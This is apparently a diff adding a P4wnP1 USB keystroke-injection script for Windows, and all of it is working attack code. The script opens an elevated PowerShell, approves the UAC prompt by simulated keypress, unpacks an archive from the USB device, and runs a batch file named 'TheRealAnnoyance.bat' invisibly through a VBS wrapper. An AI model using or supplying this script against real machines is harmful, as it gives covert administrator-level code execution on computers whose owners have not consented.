@@ -1,0 +1,21 @@
+layout("us"); // US keyboard layout
+press("WIN");
+delay(250);
+type("powershell");
+delay(250);
+press("CTRL SHIFT ENTER");
+delay(1500);
+press("ALT y");
+delay(2000);
+type("$usbPath =((gwmi win32_volume -f 'label=''P4WNP1''').Name+'Tools\')\n");
+delay(250);
+type("cd $usbPath\n");
+delay(250);
+type("Expand-Archive Private.zip\n");
+delay(2000);
+type("cd Private\n");
+delay(250);
+type("C:/windows/System32/wscript.exe invisible.vbs TheRealAnnoyance.bat\n");
+delay(2500);
+type("exit\n");
+delay(250);
